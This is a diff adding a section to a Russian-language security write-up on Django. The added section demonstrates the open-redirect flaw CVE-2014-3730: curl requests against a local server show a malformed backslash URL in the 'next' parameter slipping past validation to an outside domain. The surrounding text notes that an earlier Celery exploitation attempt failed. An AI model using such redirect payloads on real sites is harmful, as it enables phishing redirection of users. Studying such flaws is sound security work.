@@ -225,3 +225,28 @@ Celery сериализует аргументы функций. Можно се
 На этом я решил остановиться. Эксплуатировать уязвимость не получилось.
 
 Заинтересованным можно попробовать продолжить разные комбинации MySQL и Python коннектора для успешной выполнения атаки.
+
+## Issue: Malformed URLs from user input incorrectly validated (CVE-2014-3730)
+
+
+Безопасный запрос
+```
+$ curl -I "localhost:8000/i18n/setlang/?next=https://i-eat-your-skin.com/"
+HTTP/1.0 302 FOUND
+Date: Sun, 15 Jun 2014 19:22:00 GMT
+Server: WSGIServer/0.1 Python/2.7.6
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html; charset=utf-8
+Location: http://localhost:8000/
+```
+
+Опасный запрос
+```
+$ curl -I "localhost:8000/i18n/setlang/?next=https:\\i-eat-your-skin.com/"
+HTTP/1.0 302 FOUND
+Date: Sun, 15 Jun 2014 19:22:05 GMT
+Server: WSGIServer/0.1 Python/2.7.6
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html; charset=utf-8
+Location: https:%5Ci-eat-your-skin.com/
+```
